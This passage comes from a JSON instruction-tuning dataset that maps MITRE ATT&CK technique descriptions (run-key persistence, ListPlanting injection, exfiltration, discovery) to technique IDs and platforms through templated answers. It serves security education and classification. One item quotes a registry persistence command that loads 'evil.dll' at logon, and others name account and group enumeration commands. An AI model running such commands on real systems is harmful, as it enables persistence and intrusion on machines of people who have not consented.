processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.\n\nAdversaries may also leverage a Network Device CLI on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. <code>show ip route</code>, <code>show ip interface</code>).\n\nAdversaries may use the information from System Network Configuration Discovery during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery (T1016);\nTechnique System Network Configuration Discovery (T1016) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exploitation of Remote Services (T1210);\nTechnique Exploitation of Remote Services (T1210) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
      "answer": "The provided description is related to MITRE technique Exploitation of Remote Services (T1210);\nTechnique Exploitation of Remote Services (T1210) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Peripheral Device Discovery (T1120);\nTechnique Peripheral Device Discovery (T1120) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. Peripheral devices could include auxiliary resources that support a variety of functionalities such as keyboards, printers, cameras, smart card readers, or removable storage. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.",
      "answer": "The provided description is related to MITRE technique Peripheral Device Discovery (T1120);\nTechnique Peripheral Device Discovery (T1120) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.?",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
    "context": "",
    "output": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
      "answer": "The provided description is related to MITRE technique Command and Scripting Interpreter: Windows Command Shell (T1059.003);\nTechnique Command and Scripting Interpreter: Windows Command Shell (T1059.003) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other Process Injection methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory. \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",
    "context": "",
    "output": "The provided description is related to MITRE technique Process Injection: ListPlanting (T1055.015);\nTechnique Process Injection: ListPlanting (T1055.015) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items. Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. Adversaries must first copy code into the target process\u2019 memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other Process Injection methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory. \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.",
      "answer": "The provided description is related to MITRE technique Process Injection: ListPlanting (T1055.015);\nTechnique Process Injection: ListPlanting (T1055.015) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
    "context": "",
    "output": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: An adversary may rely upon a user opening a malicious file in order to gain execution. Users may be subjected to social engineering to get them to open a file that will lead to code execution. This user action will typically be observed as follow-on behavior from Spearphishing Attachment. Adversaries may use several types of files that require a user to execute them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries may employ various forms of Masquerading and Obfuscated Files or Information to increase the likelihood that a user will open and successfully execute a malicious file. These methods may include using a familiar naming convention and/or password protecting the file and supplying instructions to a user on how to open it. \n\nWhile Malicious File frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",
      "answer": "The provided description is related to MITRE technique User Execution: Malicious File (T1204.002);\nTechnique User Execution: Malicious File (T1204.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "answer": "The provided description is related to MITRE technique Application Layer Protocol: Web Protocols (T1071.001);\nTechnique Application Layer Protocol: Web Protocols (T1071.001) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Fallback Channels (T1008);\nTechnique Fallback Channels (T1008) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
      "answer": "The provided description is related to MITRE technique Fallback Channels (T1008);\nTechnique Fallback Channels (T1008) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Permission Groups Discovery: Domain Groups (T1069.002);\nTechnique Permission Groups Discovery: Domain Groups (T1069.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.\n\nCommands such as <code>net group /domain</code> of the Net utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.",
      "answer": "The provided description is related to MITRE technique Permission Groups Discovery: Domain Groups (T1069.002);\nTechnique Permission Groups Discovery: Domain Groups (T1069.002) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003);\nTechnique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003);\nTechnique Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol (T1048.003) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
    "context": "",
    "output": "The provided description is related to MITRE technique Non-Standard Port (T1571);\nTechnique Non-Standard Port (T1571) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may communicate using a protocol and port pairing that are typically not associated. For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443. Adversaries may make changes to the standard port used by a protocol to bypass filtering or muddle analysis/parsing of network data.\n\nAdversaries may also make changes to victim systems to abuse non-standard ports. For example, Registry keys and other configuration settings can be used to modify protocol and port pairings.",
      "answer": "The provided description is related to MITRE technique Non-Standard Port (T1571);\nTechnique Non-Standard Port (T1571) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
